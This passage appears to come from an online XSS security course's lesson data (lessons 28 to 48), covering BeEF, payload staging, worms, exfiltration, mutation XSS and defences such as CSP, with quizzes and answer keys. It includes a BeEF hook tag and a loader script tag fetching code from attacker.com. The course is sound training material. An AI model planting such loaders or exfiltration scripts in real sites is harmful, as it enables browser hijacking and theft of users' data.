  "title": "The Browser Exploitation Framework (BeEF)",
  "content": "<p>BeEF is a professional security tool for demonstrating the impact of browser vulnerabilities.</p><h3>How it Works:</h3><ol><li>You host the BeEF server.</li><li>Your XSS payload is a simple 'hook' script: <code>&lt;script src=\"http://beef-server:3000/hook.js\"&gt;&lt;/script&gt;</code>.</li><li>When a victim's browser executes this script, their browser becomes 'hooked'. It establishes a persistent communication channel back to your BeEF control panel.</li><li>From the control panel, you can now send dozens of different commands to the hooked browser in real time. You can get their geolocation, try to turn on their webcam (requires user permission), attempt to exploit browser plugins, and much more.</li></ol><p>BeEF is a powerful way to demonstrate the true risk of even a 'simple' XSS flaw.</p>",
  "image": "https://images.unsplash.com/photo-1614064548237-02f8f17374b2?w=800&h=400&fit=crop"
}

                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the primary function of the Browser Exploitation Framework (BeEF)?", "options": ["To find XSS vulnerabilities", "To use an existing XSS vulnerability as a beachhead to take control of a victim's browser and launch further attacks", "To act as a WAF", "To write a security report"], "correct": 1, "explanation": "BeEF is a post-exploitation framework for the browser, showing what an attacker can do *after* they have found an XSS vulnerability." }
                    ]
                }
            },
            {
                "id": "lesson-29-steganographic-xss",
                "title": "Lesson 29: Steganographic XSS",
                "duration": "120 min",
                "objectives": [
                    "Understand how to hide XSS payloads in image metadata or other seemingly benign files",
                    "Use whitespace and Unicode characters to obfuscate and deliver payloads",
                    "Exploit features that process and reflect file metadata"
                ],
                "content": {
                    "overview": "This advanced lesson explores techniques for hiding XSS payloads in plain sight. Steganography, in this context, is the art of concealing a payload within another piece of data (like an image) to bypass security filters.",
                    "sections": [
                        {
                            "title": "Image-Based Payload Delivery",
                            "content": "<p>An attacker can use an image editor to embed a JavaScript payload into an image's EXIF metadata fields (e.g., the 'Camera Model' field). They then upload this image to the vulnerable application. If a different page in the application reads this EXIF data and insecurely reflects it into the HTML, the payload will execute. This is a form of stored XSS, but it is much harder to detect because the initial file upload (the image) appears to be completely harmless to most security scanners.</p>",
                            "image": "https://images.unsplash.com/photo-1526374965328-7f61d4e18c66?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Hiding an XSS payload in an image's EXIF metadata is an example of what?", "options": ["A reflected XSS attack", "A steganographic technique for delivering a stored XSS payload", "An SQL injection attack", "A clickjacking attack"], "correct": 1, "explanation": "This technique uses the image as a 'carrier' for the malicious payload, which is a classic application of steganography." }
                    ]
                }
            },
            {
                "id": "lesson-30-multistage-xss",
                "title": "Lesson 30: Multi-Stage XSS Attacks",
                "duration": "120 min",
                "objectives": [
                    "Develop small, initial payloads ('stompers') that load a larger, second-stage payload",
                    "Use remote script loading to bypass input length restrictions",
                    "Implement anti-analysis techniques in payloads to evade detection"
                ],
                "content": {
                    "overview": "Often, an injection point will have a limit on the number of characters you can inject. This makes it impossible to insert a large, complex payload. This advanced lesson covers how to get around this with a multi-stage attack.",
                    "sections": [
                        {
  "title": "Payload Staging",
  "content": "<p>The technique is to inject a very small initial payload (a 'stomper' or 'loader') whose only job is to dynamically create a new <code>&lt;script&gt;</code> tag and set its <code>src</code> attribute to a larger, more complex JavaScript file hosted on the attacker's server.</p><h3>Example:</h3><p>The vulnerable parameter has a 50-character limit. An attacker can't fit a full keylogger in there. Instead, they inject a very small loader script:</p><p><code>&lt;script src=\"//attacker.com/x.js\"&gt;&lt;/script&gt;</code></p><p>This fits within the limit. When the victim's browser executes this, it will fetch and execute the full, unlimited-length payload from <code>x.js</code> on the attacker's server.</p>",
  "image": "https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=800&h=400&fit=crop"
}

                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the primary reason for using a multi-stage XSS payload?", "options": ["To make the attack less effective", "To bypass input length restrictions on a vulnerable parameter", "To make the payload easier to read", "To test the server's network speed"], "correct": 1, "explanation": "Payload staging is the standard technique for overcoming length limitations. The small initial payload acts as a bootloader for the much larger, full-featured payload." }
                    ]
                }
            },
            {
                "id": "lesson-31-xss-worm",
                "title": "Lesson 31: XSS Worm Development",
                "duration": "120 min",
                "objectives": [
                    "Understand the mechanics of a self-propagating XSS worm",
                    "Analyze how a worm can spread virally through a social network",
                    "Recognize the potential for exponential growth and impact"
                ],
                "content": {
                    "overview": "This lesson covers one of the most famous and high-impact applications of stored XSS: the XSS worm. A worm is a self-propagating payload that, when viewed by a victim, will automatically cause the victim to 're-post' the payload, causing it to spread virally.",
                    "sections": [
                        {
                            "title": "The Samy Worm: A Case Study",
                            "content": "<p>The most famous example is the 'Samy' worm, which spread across MySpace in 2005. The payload, embedded in Samy's profile, did two things when another user viewed it:</p><ol><li>It used an AJAX request to add 'Samy' as a friend.</li><li>It then used another AJAX request to copy its own source code (the malicious script) into the victim's own profile.</li></ol><p>Now, whenever anyone viewed the *victim's* profile, the worm would execute again, adding Samy as a friend and infecting their profile. This created exponential growth. In under 24 hours, Samy had over one million friend requests, and his worm had brought down the entire MySpace website.</p>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What makes an XSS payload a 'worm'?", "options": ["It is very long", "It is obfuscated", "It contains logic to automatically re-inject and propagate itself using the victim's authenticated session", "It only affects one user"], "correct": 2, "explanation": "The self-propagation is the key characteristic of a worm, leading to viral, exponential spread and impact." }
                    ]
                }
            },
            {
                "id": "lesson-32-advanced-exfiltration",
                "title": "Lesson 32: Advanced Data Exfiltration",
                "duration": "120 min",
                "objectives": [
                    "Use XSS to read and exfiltrate large amounts of data from a page",
                    "Compress and encode exfiltrated data to evade detection",
                    "Use covert channels like DNS for data exfiltration"
                ],
                "content": {
                    "overview": "Stealing a cookie is simple. But what if you want to use XSS to steal all the data displayed on the page, like the contents of a user's entire email inbox? This lesson covers advanced techniques for bulk data exfiltration.",
                    "sections": [
                        {
                            "title": "Exfiltrating Page Content",
                            "content": "<p>An attacker's XSS script can read the entire DOM of the page using `document.body.innerHTML`. This gives them access to all the information the victim can see. However, this data can be very large and sending it in a single GET request is not feasible. The script can break the data into smaller chunks, Base64 encode it (to handle special characters), and then send it to the attacker's server via a series of AJAX POST requests.</p>",
                            "image": "https://images.unsplash.com/photo-1555099962-4199c345e541?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Why would an XSS payload Base64 encode data before exfiltrating it?", "options": ["To make it larger", "To safely transmit the data and avoid issues with special characters that might break the exfiltration request", "To encrypt the data", "To make it human-readable"], "correct": 1, "explanation": "Base64 is a standard encoding method for safely transmitting binary or text data in environments that may have issues with certain characters, making it ideal for exfiltration." }
                    ]
                }
            },
            {
                "id": "lesson-33-mobile-xss",
                "title": "Lesson 33: Mobile Web XSS",
                "duration": "120 min",
                "objectives": [
                    "Test for XSS in mobile web applications and WebViews",
                    "Exploit touch interfaces with novel event handlers",
                    "Understand security risks in responsive design implementations"
                ],
                "content": {
                    "overview": "While the core of XSS is the same, the mobile environment has unique features and event handlers that can be abused. This lesson explores how XSS manifests in mobile web browsers and the 'WebView' components within native mobile applications.",
                    "sections": [
                        {
                            "title": "Mobile App WebView Testing",
                            "content": "<p>Many native mobile apps are actually 'hybrid' apps. They use a native component called a WebView to render a web page inside the app. This WebView is essentially a browser. If the native part of the app passes untrusted data (e.g., from a push notification or a deep link) to the WebView, it can be vulnerable to XSS. This is a common and high-impact vulnerability, as a successful XSS in a WebView can often allow an attacker to break out of the web context and interact with the native app's functions, a process known as 'bridge-jacking'.</p>",
                            "image": "https://images.unsplash.com/photo-1585250184288-5175908b083c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is a 'WebView' in a mobile app?", "options": ["The mobile browser", "An embedded browser component within a native application used to render web content", "The app store", "A type of push notification"], "correct": 1, "explanation": "WebViews are extremely common, and an insecure bridge between the native code and the WebView's JavaScript is a classic source of mobile vulnerabilities." }
                    ]
                }
            },
            {
                "id": "lesson-34-pwa-xss",
                "title": "Lesson 34: Progressive Web App (PWA) XSS",
                "duration": "120 min",
                "objectives": [
                    "Assess the security of PWA components like service workers and manifest files",
                    "Exploit insecure caching and background sync for XSS",
                    "Understand the expanded attack surface of PWAs"
                ],
                "content": {
                    "overview": "Progressive Web Apps (PWAs) are a new class of web application that can be 'installed' on a user's device and offer richer, more native-like functionality, including offline support. This lesson covers the new security risks introduced by PWA technologies.",
                    "sections": [
                        {
                            "title": "Service Worker Exploitation",
                            "content": "<p>A service worker is a powerful JavaScript file that acts as a proxy between the web app, the browser, and the network. It can intercept and handle all network requests, even when the application's tab is closed. If an attacker can get their malicious script into the service worker file (e.g., through a server-side vulnerability), they can achieve an extremely persistent and powerful XSS. They can effectively man-in-the-middle the user's entire interaction with the application.</p>",
                            "image": "https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Why is a compromised Service Worker so dangerous?", "options": ["It isn't, it's very safe", "Because it can intercept and manipulate all network requests for the application, even when the user is offline", "It can only change the color of the page", "It only works on one browser"], "correct": 1, "explanation": "The service worker's ability to act as a persistent, client-side proxy makes it a high-value target for an attacker who has found an XSS vulnerability." }
                    ]
                }
            },
            {
                "id": "lesson-35-spa-xss",
                "title": "Lesson 35: Single Page Application (SPA) XSS",
                "duration": "120 min",
                "objectives": [
                    "Identify XSS vulnerabilities in client-side routing",
                    "Exploit insecure handling of AJAX and Fetch API responses",
                    "Understand how XSS manifests in the virtual DOM"
                ],
                "content": {
                    "overview": "This lesson provides a dedicated look at how XSS works in the context of Single Page Applications (SPAs) built with frameworks like React, Angular, and Vue. While these frameworks have strong default protections, vulnerabilities often creep in at the boundaries where the application interacts with external data, like API responses.",
                    "sections": [
                        {
                            "title": "AJAX Response Manipulation",
                            "content": "<p>A common vulnerability pattern in SPAs is the insecure handling of data from an API. The SPA might make a call to an API, receive a JSON response, and then insecurely render one of the fields from that JSON into the DOM using a dangerous sink like `innerHTML`.</p><p>This means that even if the main application is secure, a separate Stored XSS vulnerability in the data returned by a backend API can lead to a DOM XSS vulnerability in the client-side SPA.</p>",
                            "image": "https://images.unsplash.com/photo-1515879218367-8466d910aaa4?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "In a Single Page Application, where are vulnerabilities that involve insecure handling of API responses typically found?", "options": ["In the initial HTML page load", "In the client-side JavaScript code that processes the asynchronous API response", "On the web server's file system", "In the CSS stylesheet"], "correct": 1, "explanation": "The vulnerability lies in the 'success' callback of the AJAX/Fetch request, where the application code takes data from the API and decides how to render it on the page." }
                    ]
                }
            },
            {
                "id": "lesson-36-websocket-xss",
                "title": "Lesson 36: WebSocket XSS",
                "duration": "120 min",
                "objectives": [
                    "Understand the security model of WebSockets for real-time communication",
                    "Inject malicious payloads into WebSocket messages",
                    "Exploit insecure handling of event-driven WebSocket data"
                ],
                "content": {
                    "overview": "WebSockets provide a full-duplex, real-time communication channel between a client and a server. This lesson covers how XSS vulnerabilities can manifest in applications that use WebSockets, such as chat applications or live dashboards.",
                    "sections": [
                        {
                            "title": "Insecure Message Handling",
                            "content": "<p>The vulnerability is similar to a standard Stored XSS. An attacker sends a message containing a JavaScript payload over the WebSocket connection. The server then broadcasts this message to all other connected clients. If the client-side JavaScript that receives the WebSocket message then insecurely writes its contents into the DOM, the payload will execute in the browsers of all other users. This is a common flaw in chat applications that don't properly encode messages before displaying them.</p>",
                            "image": "https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "XSS in a chat application using WebSockets is a form of:", "options": ["Reflected XSS", "Stored XSS", "It is not a vulnerability", "A server-side vulnerability"], "correct": 1, "explanation": "It is conceptually a form of Stored XSS because the server is 'storing' (in this case, relaying) the attacker's message, which is then delivered to and executed by other users." }
                    ]
                }
            },
            {
                "id": "lesson-37-xss-scanner-dev",
                "title": "Lesson 37: XSS Scanner Development",
                "duration": "120 min",
                "objectives": [
                    "Build a basic, automated XSS scanner in Python",
                    "Develop algorithms for generating common XSS payloads",
                    "Automate the analysis of responses to detect successful XSS"
                ],
                "content": {
                    "overview": "To truly master a subject, build it yourself. This advanced lesson challenges you to write your own basic XSS scanner. You will learn the core logic behind how automated DAST scanners find vulnerabilities.",
                    "sections": [
                        {
                            "title": "Scanner Logic",
                            "content": "<h3>A simple scanner would:</h3><ol><li>Crawl a target website to find all links and forms.</li><li>For every input parameter it finds, it will inject a test payload.</li><li>The test payload will be a unique string embedded in an XSS context (e.g., `<img src=x onerror=alert('UNIQUE_XSS_ID')>`).</li><li>The scanner will then need a way to detect if its payload executed. One way is to use a headless browser to render the response and see if the `alert` function was called.</li></ol>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "Why is a headless browser a useful component for an XSS scanner?", "options": ["It can send emails", "It can parse HTML and execute JavaScript just like a real browser, allowing the scanner to confirm if a DOM-based or reflected payload was successfully executed", "It is more secure", "It is faster than sending an HTTP request"], "correct": 1, "explanation": "A headless browser provides a way to automate the rendering of the response, which is necessary to confirm the execution of client-side script payloads." }
                    ]
                }
            },
            {
                "id": "lesson-38-fuzzing-for-xss",
                "title": "Lesson 38: Fuzzing for XSS",
                "duration": "120 min",
                "objectives": [
                    "Understand the concept of fuzzing for finding vulnerabilities",
                    "Use mutation-based and grammar-based fuzzing techniques",
                    "Develop large, custom dictionaries of XSS payloads for fuzzing"
                ],
                "content": {
                    "overview": "Fuzzing is an automated testing technique that involves providing invalid, unexpected, or random data as input to a program. This lesson covers how to apply fuzzing techniques to web applications to find XSS vulnerabilities that might be missed by simple scanners.",
                    "sections": [
                        {
                            "title": "Mutation-Based Fuzzing",
                            "content": "<p>You can use a tool like Burp Intruder with a very large list of known XSS payloads (a 'fuzz list'). You then configure the fuzzer to send each one of these payloads to a target parameter and analyze the responses for signs of successful execution (like the reflection of the payload without encoding). This 'shotgun' approach can uncover vulnerabilities that are missed by a simple scanner that only tries a few basic payloads.</p>",
                            "image": "https://images.unsplash.com/photo-1555949963-aa79dcee981c?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the core idea behind fuzzing?", "options": ["To send only valid data to an application", "To bombard an application with a massive amount of malformed and unexpected data in the hope of causing a crash or finding an exploitable security flaw", "To manually review the source code", "To fix all vulnerabilities"], "correct": 1, "explanation": "Fuzzing is an automated technique for finding bugs by providing unexpected input." }
                    ]
                }
            },
            {
                "id": "lesson-39-ml-xss-detection",
                "title": "Lesson 39: Machine Learning XSS Detection",
                "duration": "120 min",
                "objectives": [
                    "Understand how Machine Learning can be applied to XSS payload detection",
                    "Perform feature engineering on payloads to prepare them for a model",
                    "Recognize the strengths and limitations of ML-based detection"
                ],
                "content": {
                    "overview": "This forward-looking lesson explores the application of machine learning to the problem of XSS detection, a key feature in many next-generation WAFs.",
                    "sections": [
                        {
                            "title": "Feature Engineering",
                            "content": "<p>An ML model cannot understand a raw string. You must first perform 'feature engineering' to convert a payload into a set of numerical features that the model can understand. For an XSS payload, these features might include:</p><ul><li>The length of the string.</li><li>The number of special characters (`< > ( )`).</li><li>The presence of keywords (`script`, `onload`).</li><li>The ratio of uppercase to lowercase letters.</li></ul><p>A classifier can then be trained on thousands of labeled benign and malicious examples to learn to predict whether a new, unseen input is likely to be an XSS attack.</p>",
                            "image": "https://images.unsplash.com/photo-1620712943543-959bab121695?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is 'feature engineering' in the context of ML-based XSS detection?", "options": ["A way to bypass a WAF", "The process of converting a raw text payload into a set of numerical features that an ML model can process", "A method for writing secure code", "A type of XSS attack"], "correct": 1, "explanation": "Feature engineering is the critical and often most difficult step in applying machine learning to a new problem domain." }
                    ]
                }
            },
            {
                "id": "lesson-40-tool-integration",
                "title": "Lesson 40: Integration with Security Tools",
                "duration": "120 min",
                "objectives": [
                    "Integrate SAST, DAST, and IAST tools into a comprehensive security testing strategy",
                    "Understand the pros and cons of each tool type",
                    "Build a security pipeline that leverages the strengths of multiple tools"
                ],
                "content": {
                    "overview": "This lesson provides a holistic view of the automated security testing landscape, explaining how SAST, DAST, and the emerging IAST technology fit together.",
                    "sections": [
                        {
                            "title": "Interactive Application Security Testing (IAST)",
                            "content": "<p>IAST is a newer technology that combines elements of SAST and DAST. It uses an agent that instruments the running application on the server. When a DAST scan is run against the application, the IAST agent can see exactly which lines of code were executed by the DAST payload. This allows it to confirm vulnerabilities with a much higher degree of accuracy than a standalone SAST or DAST tool and can pinpoint the exact vulnerable line of code.</p>",
                            "image": "https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the primary advantage of an IAST tool?", "options": ["It is the fastest type of scanner", "It combines the 'inside-out' view of SAST with the 'outside-in' view of DAST to provide more accurate, low-false-positive results", "It is free", "It replaces the need for a developer"], "correct": 1, "explanation": "IAST's ability to see both the attack from the DAST and the code path it took on the server is what makes it so powerful and accurate." }
                    ]
                }
            },
            {
                "id": "lesson-41-xss-prevention",
                "title": "Lesson 41: XSS Prevention Techniques",
                "duration": "120 min",
                "objectives": [
                    "Master the core defensive techniques: input validation and output encoding",
                    "Implement a robust Content Security Policy (CSP)",
                    "Apply the principle of defense-in-depth to XSS mitigation"
                ],
                "content": {
                    "overview": "This critical defensive lesson synthesizes all the mitigation strategies discussed throughout the course into a coherent, multi-layered defensive strategy. We will focus on the two most important controls: output encoding and Content Security Policy.",
                    "sections": [
                        {
                            "title": "Defense in Depth for XSS",
                            "content": "<p>A layered defense is the only effective defense.</p><ol><li><strong>Input Validation:</strong> Use a strict allow-list to reject any data that is not in a valid format.</li><li><strong>Output Encoding:</strong> This is the primary fix. Use a trusted library to perform context-aware output encoding on all user-supplied data before it is rendered on a page.</li><li><strong>Content Security Policy (CSP):</strong> This is a powerful, defense-in-depth control. It acts as a final backstop to mitigate the impact of an XSS vulnerability that was missed.</li><li><strong>HttpOnly Cookies:</strong> This prevents an attacker from stealing session cookies via XSS.</li><li><strong>Modern Frameworks:</strong> Use modern frameworks like React or Angular that provide strong, built-in XSS protection by default.</li></ol>",
                            "image": "https://images.unsplash.com/photo-1517694712202-14261e80e3a5?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the number one, most effective primary defense against XSS?", "options": ["A firewall", "Using only HTTPS", "Context-aware output encoding", "A strong password policy"], "correct": 2, "explanation": "While all the other layers are important, proper output encoding is the fundamental fix that directly addresses the root cause of the vulnerability." }
                    ]
                }
            },
            {
                "id": "lesson-42-csp-advanced",
                "title": "Lesson 42: Content Security Policy Advanced",
                "duration": "120 min",
                "objectives": [
                    "Implement a strict, nonce-based or hash-based Content Security Policy",
                    "Use the `report-uri` and `report-to` directives to collect and analyze CSP violation reports",
                    "Understand common CSP bypass techniques and how to prevent them"
                ],
                "content": {
                    "overview": "A basic Content Security Policy (CSP) is good, but a strict CSP is a powerful security control. This lesson provides a deep dive into the advanced features of CSP that allow you to lock down your application's client-side resources and get real-time reports of any attempted violations.",
                    "sections": [
                        {
  "title": "Strict CSP",
  "content": "<p>A simple, host-based allow-list in CSP can be bypassed. A 'strict' CSP is much more secure. It aims to completely disable the use of inline scripts <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> or <code>&lt;div onclick=...&gt;</code>.</p><h3>Nonce-based CSP:</h3><p>To allow your legitimate inline scripts to run, the server generates a new, large, random number (a 'nonce') for every single HTTP request. It includes this nonce in the CSP header <code>script-src 'nonce-RANDOM_VALUE'</code>. It also adds this same nonce as an attribute to every legitimate <code>&lt;script&gt;</code> tag on the page. The browser will then only execute scripts that have the correct nonce value. An attacker who finds an XSS vulnerability cannot guess the random nonce for the victim's session, so their injected inline script will be blocked by the browser.</p>",
  "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
}

                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the primary benefit of a 'nonce-based' Content Security Policy?", "options": ["It is easier to configure", "It allows all inline scripts to run", "It provides a highly secure way to disable all attacker-injected inline scripts while still allowing your own legitimate scripts to run", "It makes your website faster"], "correct": 2, "explanation": "A nonce-based strict CSP is the gold standard for XSS mitigation, providing a very strong defense against the execution of untrusted inline scripts." }
                    ]
                }
            },
            {
                "id": "lesson-43-http-security-headers",
                "title": "Lesson 43: HTTP Security Headers",
                "duration": "120 min",
                "objectives": [
                    "Implement all key HTTP security headers as a defense-in-depth measure",
                    "Understand the purpose and syntax of headers like X-Content-Type-Options and X-Frame-Options",
                    "Configure Referrer-Policy for privacy and security"
                ],
                "content": {
                    "overview": "Beyond CSP, there is a suite of other security-related HTTP headers that you can set to enable the browser's built-in defenses. This lesson is a comprehensive guide to these headers.",
                    "sections": [
                        {
                            "title": "The Security Header Suite",
                            "content":  "<ul><li><strong><code>Strict-Transport-Security</code> (HSTS):</strong> Enforces HTTPS.</li><li><strong><code>Content-Security-Policy</code> (CSP):</strong> Prevents XSS.</li><li><strong><code>X-Frame-Options</code> or <code>CSP frame-ancestors</code>:</strong> Prevents clickjacking.</li><li><strong><code>X-Content-Type-Options: nosniff</code>:</strong> Prevents the browser from trying to guess a file's content type, which can stop some attacks where an attacker uploads a script disguised as an image.</li><li><strong><code>Referrer-Policy</code>:</strong> Controls how much referrer information is sent with requests, protecting user privacy.</li></ul>"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                   "questions": [
  { 
    "id": 1, 
    "question": "What does the header <code>X-Content-Type-Options: nosniff</code> do?", 
    "options": [
      "It allows the browser to guess content types", 
      "It prevents the browser from trying to interpret a file as a different content type than what the server specified (e.g., executing a text file as JavaScript)", 
      "It enables XSS", 
      "It makes the website slower"
    ], 
    "correct": 1, 
    "explanation": "This header is an important defense-in-depth control that mitigates a class of XSS attacks known as 'content sniffing'."
  }
]

                }
            },
            {
                "id": "lesson-44-rasp",
                "title": "Lesson 44: Runtime Application Self-Protection (RASP)",
                "duration": "120 min",
                "objectives": [
                    "Understand how RASP provides real-time attack detection and response from within an application",
                    "Differentiate between monitoring and blocking modes in RASP",
                    "Evaluate the performance impact and trade-offs of using RASP"
                ],
                "content": {
                    "overview": "Runtime Application Self-Protection (RASP) is an emerging security technology that instruments an application to protect itself from the inside. This lesson provides an overview of how RASP works and its role in a defense-in-depth strategy.",
                    "sections": [
                        {
                            "title": "How RASP Works",
                            "content": "<p>A RASP solution uses a library or agent that gets integrated directly into the application's runtime environment (e.g., the JVM for Java, the .NET CLR for C#). It has deep visibility into the application's internal data flows and function calls.</p><p>When it sees a request that looks like an attack (e.g., an XSS payload in a parameter), it can see that untrusted data flowing towards a dangerous sink (like a function that renders HTML). It can then intervene in real time to either block the request or log a detailed alert. Because it has the full context of the application's code, it can be much more accurate than a WAF, which can only see the raw HTTP request from the outside.</p>",
                            "image": "https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the key advantage of a RASP solution over a traditional WAF?", "options": ["It is less expensive", "Because it runs inside the application, it has much more context and can make more accurate decisions about what is and is not an attack", "It is easier to deploy", "It does not require any configuration"], "correct": 1, "explanation": "This inside-out view is what allows RASP to be so accurate, significantly reducing the false positives that can plague traditional WAFs." }
                    ]
                }
            },
            {
                "id": "lesson-45-xss-research-methodologies",
                "title": "Lesson 45: XSS Research Methodologies",
                "duration": "120 min",
                "objectives": [
                    "Understand the process of vulnerability research for finding new XSS techniques",
                    "Explore the methodologies for discovering 0-day XSS flaws in web applications",
                    "Learn from the analysis of real-world, complex XSS vulnerabilities"
                ],
                "content": {
                    "overview": "This advanced lesson looks at the world of security research. We will explore the methodologies that security researchers use to discover new, previously unknown (0-day) XSS vulnerabilities in complex web applications and frameworks.",
                    "sections": [
                        {
                            "title": "Finding Novel Bugs",
                            "content": "<p>Finding 0-day XSS often involves reading the source code of popular frameworks to find new DOM XSS sources or sinks that are not widely known. It can also involve deep analysis of how different browsers parse malformed HTML, looking for edge cases that can be abused to bypass common sanitization libraries.</p>",
                            "image": "https://images.unsplash.com/photo-1542831371-d531d209121f?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What does a security researcher typically do when they find a 0-day XSS vulnerability in a popular framework?", "options": ["Sell it on the dark web", "Post it on Twitter immediately", "Follow the principles of responsible disclosure, privately reporting it to the framework's maintainers and giving them time to fix it", "Ignore it"], "correct": 2, "explanation": "Responsible disclosure is the ethical standard, allowing vendors to fix the issue and protect their users before the vulnerability becomes public knowledge." }
                    ]
                }
            },
            {
                "id": "lesson-46-mxss",
                "title": "Lesson 46: Mutation XSS (mXSS)",
                "duration": "120 min",
                "objectives": [
                    "Understand how browser parsing inconsistencies can lead to vulnerabilities",
                    "Exploit DOM clobbering techniques to manipulate application logic",
                    "Bypass popular HTML sanitization libraries using advanced mutation techniques"
                ],
                "content": {
                    "overview": "This is one of the most advanced and complex topics in XSS. Mutation XSS (mXSS) is a vulnerability that occurs when an application uses an HTML sanitization library, but the browser's own HTML parser interprets the (supposedly safe) HTML differently than the sanitizer did, 'mutating' it into an unsafe form that allows for script execution.",
                    "sections": [
                        {
                            "title": "Sanitizer vs. Browser",
                            "content": "<p>The attack works because the HTML specification is complex, and different sanitizers and browsers might have subtle differences in how they handle strange or malformed HTML. An attacker will try to craft a piece of HTML that seems safe to the sanitizer (so it allows it), but that the browser will then parse in a different, dangerous way.</p>",
                            "image": "https://images.unsplash.com/photo-1555099962-4199c345e541?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "What is the root cause of a Mutation XSS (mXSS) vulnerability?", "options": ["A weak password", "A discrepancy between how a security sanitizer parses HTML and how the browser parses it", "An SQL Injection flaw", "A server misconfiguration"], "correct": 1, "explanation": "mXSS is a sanitizer bypass that exploits the subtle and complex edge cases of the HTML parsing specification." }
                    ]
                }
            },
            {
                "id": "lesson-47-uxss-research",
                "title": "Lesson 47: Universal XSS Research",
                "duration": "120 min",
                "objectives": [
                    "Understand the concept of a Universal XSS (UXSS) vulnerability",
                    "Analyze vulnerabilities in the browser itself or its extensions that can lead to UXSS",
                    "Recognize the critical impact of a UXSS flaw"
                ],
                "content": {
                    "overview": "Universal XSS is the holy grail of client-side vulnerabilities. This lesson covers this rare and devastating class of vulnerability, which exists not in a single web application, but in the browser itself or one of its extensions.",
                    "sections": [
                        {
  "title": "Breaking the Browser",
  "content": "<p>A Universal XSS (UXSS) is a vulnerability in the browser that allows an attacker to completely violate the Same-Origin Policy. An attacker who finds a UXSS could craft a payload on their own malicious website <code>evil.com</code> that would then be able to execute script in the context of <em>any other open website</em> in the user's browser, allowing them to read data from their online banking, their email, and their social media, all at the same time. These are critical bugs in the browser itself and are taken extremely seriously by vendors like Google and Mozilla.</p>",
  "image": "https://images.unsplash.com/photo-1614064548237-02f8f17374b2?w=800&h=400&fit=crop"
}

                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "A Universal XSS (UXSS) is a vulnerability in what component?", "options": ["A single web application", "A web server's configuration", "The user's password", "The browser itself or a browser extension"], "correct": 3, "explanation": "UXSS is a browser-level vulnerability that fundamentally breaks the Same-Origin Policy, making it far more severe than a standard XSS in a single website." }
                    ]
                }
            },
            {
                "id": "lesson-48-xss-emerging-tech",
                "title": "Lesson 48: XSS in Emerging Technologies",
                "duration": "120 min",
                "objectives": [
                    "Assess the security of WebAssembly (WASM) and its interaction with the DOM",
                    "Explore potential XSS vectors in AR/VR web applications (WebXR)",
                    "Analyze the client-side security of Decentralized Applications (dApps)"
                ],
                "content": {
                    "overview": "The web is constantly evolving. This final advanced lesson looks to the future, exploring the potential attack surfaces for client-side injection in emerging technologies like WebAssembly, WebXR, and blockchain-based dApps.",
                    "sections": [
                        {
                            "title": "WebAssembly (WASM) Security",
                            "content": "<p>WebAssembly provides a way to run high-performance, near-native code in the browser. It runs in the same sandboxed environment as JavaScript and has the same access to the DOM. A key security consideration is the 'bridge' between JavaScript and WASM. If a WASM module takes untrusted data from JavaScript and then calls a JavaScript function that acts as a sink, it could introduce a new and complex path for a DOM XSS vulnerability.</p>",
                            "image": "https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=800&h=400&fit=crop"
                        }
                    ]
                },
                "quiz": {
                    "passingScore": 80,
                    "questions": [
                        { "id": 1, "question": "True or False: WebAssembly code is not subject to the Same-Origin Policy.", "options": ["True", "False"], "correct": 1, "explanation": "False. WebAssembly runs within the browser's standard security sandbox and is subject to the same fundamental security policies as JavaScript, including the SOP." }
                    ]
                }
            },
            {
                "id": "lesson-49-xss-assessment-methodology",
                "title": "Lesson 49: Professional XSS Assessment Methodology",
